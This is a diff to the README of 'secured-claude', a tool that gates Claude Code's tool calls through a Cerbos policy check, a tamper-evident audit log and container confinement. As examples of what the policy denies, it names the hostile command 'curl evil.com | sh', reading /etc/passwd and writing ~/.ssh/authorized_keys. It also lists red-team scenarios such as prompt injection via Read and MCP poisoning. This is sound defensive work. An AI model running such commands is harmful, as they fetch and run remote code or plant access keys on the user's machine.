@@ -17,7 +17,7 @@
 
 <p align="center">
   <a href="https://gitlab.com/benoit.besson/secured-claude/-/pipelines"><img src="https://gitlab.com/benoit.besson/secured-claude/badges/main/pipeline.svg" alt="pipeline"></a>
-  <a href="docs/SECURITY.md"><img src="https://img.shields.io/badge/security--audit-pass-brightgreen" alt="security audit"></a>
+  <a href="docs/security/threat-model.md"><img src="https://img.shields.io/badge/security--audit-pass-brightgreen" alt="security audit"></a>
   <a href="LICENSE"><img src="https://img.shields.io/badge/license-MIT-blue" alt="license"></a>
   <a href="pyproject.toml"><img src="https://img.shields.io/badge/python-3.11%2B-blue" alt="python"></a>
   <a href="https://cerbos.dev"><img src="https://img.shields.io/badge/policy--engine-cerbos-ff6b35" alt="cerbos"></a>
@@ -26,6 +26,82 @@
 </p>
 
 ---
+
+## What this is + why it exists
+
+`secured-claude` is a **Python wrapper around [Anthropic Claude Code](https://www.anthropic.com/claude-code)** that gates every tool call (`Read` / `Write` / `Edit` / `Bash` / `WebFetch` / `WebSearch` / MCP / `Task`) through a [Cerbos](https://cerbos.dev) policy decision point and persists every approval in an append-only SQLite audit log.
+
+**Concrete use case** : a developer on their laptop wants the productivity of Claude Code (TUI, agentic loop, MCP) without giving the agent **silent** access to `~/.ssh/`, `~/.aws/`, the rest of their HOME, the network, or the shell. They install `secured-claude`, run `secured-claude up`, and from there `secured-claude run "..."` feels like `claude` itself — except every tool intent is validated against policy, and a denied request is visible in the audit log within milliseconds.
+
+**Scope** : single-user dev tool. One developer, one laptop, one broker on `127.0.0.1:8765`. Not a SaaS gateway, not a multi-tenant federation, not enterprise PKI infrastructure. The 4 things below are the load-bearing reasons this project is shaped the way it is :
+
+1. **No silent exfiltration.** The default-deny policy catches `Read /etc/passwd`, `Bash "curl evil.com | sh"`, `Write ~/.ssh/authorized_keys`, etc. before they execute, not after. Mapped to OWASP A01:2021 (Broken Access Control).
+2. **Complete audit trail.** Every tool call (allowed or denied) is logged with a SHA-256 hash chain ([ADR-0024](docs/adr/0024-hash-chain-audit-log.md)) so post-incident review can detect tampering. Mapped to OWASP A09:2021 (Logging Failures).
+3. **Policy as code.** Cerbos YAML lives in `policies/`, lintable via `cerbos compile`, version-controlled in git. The user can read and review the policy without reading Python source.
+4. **Defense in depth without ceremony.** Even if the policy gate is bypassed (compromised hook, future Claude Code CVE), the agent is in a hardened Docker container with workspace-only filesystem mount, network egress allowlist, DNS allowlist, and `cap_drop=ALL` — bounded blast radius without operator-side configuration.
+
+## Why each tool exists in the stack
+
+The project deliberately uses **6 load-bearing components** ; each addresses a specific reason that simpler alternatives fail. The full justifications live in the [ADRs](docs/adr/) (every load-bearing decision has an ADR per the Nygard format) ; the table below is the executive summary :
+
+| Component | Role | Why this and not the obvious alternative |
+|---|---|---|
+| **Claude Code's PreToolUse hook** ([ADR-0002](docs/adr/0002-pretooluse-hook-as-interception-point.md)) | Single interception point for **every** tool call, before execution | A network-side proxy (mitmproxy, etc.) only sees HTTP — misses Bash and MCP. Patching the Claude Code binary breaks on every upstream release. The native hook is Anthropic-supported, surface-uniform, and sub-50 ms p99. |
+| **Cerbos PDP** ([ADR-0001](docs/adr/0001-cerbos-as-policy-decision-point.md)) | Evaluates policy decisions outside the broker process | A Python-coded allowlist mixes policy with code and can't be reviewed by a non-Python security person. Cerbos is CNCF-Sandbox, lintable (`cerbos compile`), supports signed policy bundles, and emits structured decision logs. The security team can read the YAML without reading the broker. |
+| **FastAPI broker on 127.0.0.1:8765** ([ADR-0006](docs/adr/0006-host-side-broker.md)) | Translates hook payloads → Cerbos requests → audit-log writes | If the broker lived inside the Claude Code container, a compromised LLM could tamper with the validator. The host-side broker keeps the trust boundary explicit : agent inside container = untrusted ; broker outside = trusted. Loopback bind = the trust boundary IS network-isolation. |
+| **Append-only SQLite audit log** ([ADR-0004](docs/adr/0004-append-only-sqlite-audit-log.md), [ADR-0024](docs/adr/0024-hash-chain-audit-log.md)) | Persists every decision with a tamper-evident SHA-256 chain | A JSON-lines log file is human-readable but trivially editable. SQLite is durable, queryable, single-file, cross-platform, and supports a trigger that REJECTS UPDATE / DELETE — guaranteeing append-only at the DB level. |
+| **Docker containerisation** ([ADR-0005](docs/adr/0005-containerised-claude-code.md)) | Confines the agent to `/workspace/` ; bounds blast radius if the policy gate is bypassed | Host-installed Claude Code can read the entire HOME on the first approved Bash command. Containerised, even an approved `git status` only sees `/workspace/`. v0.4 made this a multi-arch (amd64 + arm64) cosign-signed image ([ADR-0028](docs/adr/0028-multi-arch-images-manifest-list.md)) for Apple Silicon parity. |
+| **L2 + L3 + L4 confinement** ([ADR-0019](docs/adr/0019-l2-egress-proxy-tinyproxy.md), [ADR-0020](docs/adr/0020-l3-dns-allowlist-dnsmasq.md), [ADR-0022](docs/adr/0022-intent-layer-vs-confinement-layers.md)) | tinyproxy (egress allowlist) + dnsmasq (DNS allowlist) + cap_drop/seccomp/read-only | If the L1 hook is bypassed, the agent still can't reach `evil.com` (egress denies CONNECT), can't resolve `evil.com` (DNS returns REFUSED), and can't escalate (cap_drop ALL). Independent confinement per [ADR-0022](docs/adr/0022-intent-layer-vs-confinement-layers.md) — bypassing one doesn't bypass the others. |
+
+**Read [ADR-0022](docs/adr/0022-intent-layer-vs-confinement-layers.md) before evaluating "is this defense in depth or marketing"** : we explicitly distinguish the **1 intent layer** (L1, the hook + Cerbos — the only layer that understands the agent's *intent*) from the **3 confinement layers** (L2/L3/L4 — they bound blast radius but don't replace L1's semantic decisions). That ADR superseded the earlier v0.1 framing of "4 independent layers" which was overstated.
+
+## Technical decomposition
+
+```
+┌─────────────────────────── HOST ────────────────────────────┐   ┌─────────── DOCKER ───────────┐
+│                                                             │   │                              │
+│  ┌──────────────────┐   ┌──────────────────┐                │   │  ┌─────────────────────┐    │
+│  │ secured-claude   │   │ FastAPI broker   │   POST /check  │   │  │ cerbos/cerbos       │    │
+│  │ (CLI, Python)    │──▶│ 127.0.0.1:8765   │ ◀──────────────┼───┼──│ HTTP :3592          │    │
+│  │ orchestrator +   │   │ + audit DB       │                │   │  │ policies/*.yaml     │    │
+│  │ docker SDK       │   │ + Prometheus     │                │   │  └─────────────────────┘    │
+│  └──────────────────┘   └──────────────────┘                │   │                              │
+│       ▲   spawns                ▲                           │   │  ┌─────────────────────┐    │
+│       │                         │                           │   │  │ secured-claude/     │    │
+│       │                         │ HTTP CheckResources       │   │  │ claude-code         │    │
+│       │                         ▼                           │   │  │ /workspace mounted  │    │
+│  ┌──────────────────┐                                       │   │  │ PreToolUse hook ───┼───▶│
+│  │ user terminal    │                                       │   │  └─────────────────────┘    │
+│  └──────────────────┘                                       │   │                              │
+└─────────────────────────────────────────────────────────────┘   └──────────────────────────────┘
+```
+
+**Flow of one tool call** :
+
+1. The user runs `secured-claude run "refactor src/foo.py"`. The CLI (orchestrator) ensures the cerbos + claude-code containers are up, then attaches a TTY to the agent container.
+2. Inside the agent container, Claude Code decides to invoke `Edit src/foo.py`.
+3. The **PreToolUse hook** fires, executes the bundled `secured-claude-hook` Python binary, which POSTs `{tool, tool_input, principal_id, session_id}` to the broker on `host.docker.internal:8765`.
+4. The **broker** receives the request, maps `(Edit, file_path=src/foo.py)` → Cerbos resource `(file, edit, attr={path})`, sends a `CheckResources` request to the cerbos container.
+5. **Cerbos** evaluates `policies/filesystem.yaml` against the request, returns `EFFECT_ALLOW` or `EFFECT_DENY`.
+6. The broker writes the decision into the **SQLite audit log** (with SHA-256 hash chaining), then returns the result to the hook.
+7. The hook prints the standard Claude Code hook JSON (`{"permissionDecision": "allow"|"deny", "permissionDecisionReason": "..."}`) and exits. Claude Code either runs the edit or surfaces the deny reason to the LLM, which can then ask a different question.
+
+End-to-end p99 latency budget : 50 ms ([ADR-0002](docs/adr/0002-pretooluse-hook-as-interception-point.md) target). Typical observed : 5-15 ms on cache-warm Cerbos.
+
+The full runtime decomposition lives in [`src/secured_claude/`](src/secured_claude/) :
+
+| File | Responsibility |
+|---|---|
+| `cli.py` | argparse-based subcommand routing : `up`, `down`, `run`, `audit`, `audit-demo`, `policy lint/stats/template`, `principal validate`, `audit-anchor`, `doctor` |
+| `orchestrator.py` | Docker SDK lifecycle (pull, up, down, exec) + cross-platform path handling |
+| `gateway.py` | FastAPI `/check` + `/health` + `/metrics` route, tool→Cerbos-resource mapping |
+| `cerbos_client.py` | Thin `requests` wrapper for `/api/check/resources` |
+| `principals.py` | `YAMLPrincipalProvider` + `HTTPPrincipalProvider` (with TTL cache + bearer + mTLS + max-stale-age + per-issuer config) |
+| `oidc.py` | `OIDCVerifier` + `MultiIssuerVerifier` for JWT validation against IdP JWKS |
+| `metrics.py` | Prometheus counters + histograms (used for `curl /metrics` diagnostics, not SLO infra) |
+| `store.py` | SQLite append-only audit log with SHA-256 hash chain + external anchor commands |
+| `hook.py` | The PreToolUse hook entry point bundled into the agent container |
+| `audit.py` + `audit_demo.py` | `audit` query command + 35-scenario red-team replay battery |
 
 ## Status — verify in 60 seconds
 
@@ -44,9 +120,9 @@ bash bin/security-scans.sh
 #     pytest 253/253, coverage 91.5 % ; SBOM 140 packages.
 
 # 2. Live policy gate (~30 s) — boots a real Cerbos PDP and replays
-#    19 red-team + 7 happy-path scenarios end-to-end :
+#    28 red-team + 7 happy-path scenarios end-to-end (35 total) :
 bash bin/security-audit.sh
-#   → Verdict ✅ PASS (26/26) — every red-team DENY, every happy-path ALLOW.
+#   → Verdict ✅ PASS (35/35) — every red-team DENY, every happy-path ALLOW.
 
 # 3. Last green CI pipeline on macbook-local runner :
 #    https://gitlab.com/benoit.besson/secured-claude/-/pipelines/2487406196
@@ -64,7 +140,7 @@ secured-claude audit --denied
 #     5 ms duration, with cerbos_reason captured.
 ```
 
-### What is real now (v0.2.0)
+### What is real now (v0.7.4)
 
 | Claim | Where | How to check |
 |---|---|---|
@@ -72,7 +148,7 @@ secured-claude audit --denied
 | FastAPI broker on host:8765 | `src/secured_claude/gateway.py` (75 lines, 100 % covered) | `tests/test_gateway.py` (8 tests) |
 | Append-only SQLite audit | `src/secured_claude/store.py` (85 lines, 98 % covered) | `tests/test_store.py` includes UPDATE/DELETE refused by trigger |
 | Claude Code container hardened | `Dockerfile.claude-code` + `docker-compose.yml` (non-root UID 1001, read-only cerbos rootfs, cap_drop ALL, healthcheck) | `secured-claude doctor`, `secured-claude up` |
-| 44 ADRs justifying every decision | `docs/adr/0000-template.md` + `0001..0044-*.md` | `ls docs/adr/` |
+| 45 ADRs justifying every decision | `docs/adr/0000-template.md` + `0001..0045-*.md` | `ls docs/adr/` |
 | GitLab CI green on macbook-local runner | `.gitlab-ci.yml` + `.gitlab-ci/{lint,test,security,build,publish,release}.yml` | [pipeline #2487406196](https://gitlab.com/benoit.besson/secured-claude/-/pipelines/2487406196) |
 | 7-layer security pipeline | `bin/security-scans.sh` + `pyproject.toml [tool.bandit]` | `bash bin/security-scans.sh` |
 | SBOM (SPDX 2.3) per release | `.gitlab-ci/security.yml::security:sbom` | release artifact `sbom.spdx.json` |
@@ -127,7 +203,7 @@ of L1 is therefore *bounded*, not *catastrophic* — but L2/L3/L4 don't
 (FS-tamper-evident audit log, multi-principal, runtime-smoke-in-CI,
 read_only on sidecars) are documented above.
 
-Full honest limits in [`SECURITY.md` §"Out-of-scope"](SECURITY.md#out-of-scope-honest-limits) and the residual-risks table in [`docs/security/threat-model.md` §7](docs/security/threat-model.md).
+Full honest limits in the residual-risks table in [`docs/security/threat-model.md`](docs/security/threat-model.md).
 
 ---
 
@@ -137,7 +213,7 @@ Full honest limits in [`SECURITY.md` §"Out-of-scope"](SECURITY.md#out-of-scope-
 >
 > - 🔒 **Sécurité** — defense-in-depth : **1 intent layer + 3 confinement layers** ([ADR-0022](docs/adr/0022-intent-layer-vs-confinement-layers.md)). L1 (PreToolUse hook + Cerbos PDP) is the semantic gate that understands the agent's *intent* and decides on policy. L2 (tinyproxy egress allowlist), L3 (dnsmasq DNS allowlist + workspace-only FS mount), and L4 (cap_drop + read_only + seccomp + cgroups) bound the blast radius if L1 is bypassed. Hash-chain audit log + external anchor (ADR-0024 + ADR-0029). 5 cosign-signed multi-arch images cover binary + policy bytes (ADR-0028 + ADR-0035 + ADR-0036). Optional external-IdP integration : YAML directory or HTTP fetch with TTL cache + bearer auth + stale-on-error + bounded staleness (ADR-0034 + ADR-0037 + ADR-0039), and end-to-end JWT validation against the IdP's JWKS so a malicious local process can't spoof the agent's principal_id (ADR-0038).
 > - 🤖 **IA** — Claude Code wrapped in a policy-gated container, every tool call (Read / Write / Edit / Bash / WebFetch / MCP / Task) intercepted via the native PreToolUse hook.
-> - 🏛 **Architecture** — Hexagonal-lite Python broker (host) + Cerbos PDP (container) + Claude Code CLI (container) ; clear trust boundary between intent (LLM) and execution (broker). 44 ADRs covering every security + operational decision.
+> - 🏛 **Architecture** — Hexagonal-lite Python broker (host) + Cerbos PDP (container) + Claude Code CLI (container) ; clear trust boundary between intent (LLM) and execution (broker). 45 ADRs covering every security + operational decision (incl. ADR-0045 formally rejecting agent↔broker mTLS / background JWKS refresh / OTLP push as out-of-scope for the single-user use case).
 > - 📊 **Observabilité** — Prometheus counters + histograms at `/metrics` (loopback-only) covering JWT-deny / JWKS-degraded / stale-cache / cerbos-unavailable + end-to-end + per-stage latencies (ADR-0042 + ADR-0043). Useful for "is the broker slow ?" diagnostics via `curl /metrics` ; the SaaS-tier SLO alert framing originally in ADR-0043 was redressed in the scope-honesty pass.
 > - ✅ **Qualité** — 253 unit + integration tests, 90 % coverage gate. Security audit demonstration with 19 red-team scenarios + 7 happy-paths + policy fuzz + 8 static scans, run on every release.
 > - 🔄 **CI/CD** — GitLab CI 8 stages (lint / test / security / build / smoke / publish / release), audit-demo strict gate on releases, cosign keyless signing + Syft SBOM for supply-chain provenance. Tag-pipeline hardened against Docker Hub rate limits (mirror.gcr.io) + idempotent re-tag publish (twine shell-wrap).
@@ -195,17 +271,6 @@ What this defends against : "you say you have 92 % coverage but I can't verify" 
 
 ---
 
-## Why secured-claude
-
-Claude Code is the most ergonomic agentic CLI today — but for **enterprise adoption** you need :
-
-1. **No silent exfiltration** of filesystem secrets (`~/.ssh`, `~/.aws`, `.env`), shell-arbitrary execution, or unconstrained network egress.
-2. **Complete audit trail** of every action the agent took — for compliance, postmortems, and security review.
-3. **Policy-as-code** that the security team can read, lint, sign, and version — not Python code or settings.json deny-lists.
-4. **Cross-platform** install (Mac / Linux / Windows) for heterogeneous dev fleets.
-
-`secured-claude` provides the **comfort of Claude Code** while delivering all four. Same TUI, same slash commands, same MCP support — but every tool call is gated by a Cerbos policy and logged to a queryable audit DB.
-
 ## Quick start
 
 ```bash
@@ -241,18 +306,18 @@ HOST                                     DOCKER (network: secured-claude-net)
                                        └──────────────────────────────────────┘
 ```
 
-Full design : see [`docs/architecture.md`](docs/architecture.md) and the [16 ADRs](docs/adr/).
+Full design : see the **Technical decomposition** section above + the [45 ADRs](docs/adr/).
 
 ## Security
 
-- **Threat model** : [`docs/SECURITY.md`](docs/SECURITY.md) — STRIDE table mapping each threat to which defense layer catches it.
-- **Audit demonstration** : `secured-claude audit-demo --strict` runs 6 red-team scenarios + 2 happy-paths + 50+ policy fuzz variants + 8 static scans, produces a timestamped report. Required to pass before every release.
-- **Policy as code** : [`policies/`](policies/) — Cerbos YAML, lintable via `cerbos compile`, signable via Cerbos signed bundles.
-- **Audit log** : SQLite append-only at `~/.local/share/secured-claude/approvals.db` (Linux) / `~/Library/Application Support/secured-claude/` (Mac) / `%LOCALAPPDATA%\secured-claude\` (Windows).
+- **Threat model** : [`docs/security/threat-model.md`](docs/security/threat-model.md) — STRIDE table mapping each threat to which defense layer catches it.
+- **Audit demonstration** : `secured-claude audit-demo --strict` runs 28 red-team scenarios + 7 happy-paths (35 total — covers FS exfil, FS inject, Shell RCE, Net exfil, MCP abuse, Path traversal, MCP poisoning, prompt-injection-via-Read, supply-chain tool-rebind) + 50+ policy fuzz variants + 8 static scans, produces a timestamped report. Required to pass before every release.
+- **Policy as code** : [`policies/`](policies/) — Cerbos YAML, lintable via `cerbos compile`, signable via Cerbos signed bundles. New deployments scaffold via `secured-claude policy template developer-default --output policies/`.
+- **Audit log** : SQLite append-only at `~/.local/share/secured-claude/approvals.db` (Linux) / `~/Library/Application Support/secured-claude/` (Mac) / `%LOCALAPPDATA%\secured-claude\` (Windows). Tamper-evident SHA-256 hash chain ([ADR-0024](docs/adr/0024-hash-chain-audit-log.md)) + external anchor for FS-layer tamper detection ([ADR-0029](docs/adr/0029-external-hash-anchor.md)).
 
 ## Architecture decisions
 
-The 22 ADRs in [`docs/adr/`](docs/adr/) justify every load-bearing choice. Highlights :
+The 45 ADRs in [`docs/adr/`](docs/adr/) justify every load-bearing choice. Highlights :
 
 | # | Decision | Why it matters |
 |---|---|---|
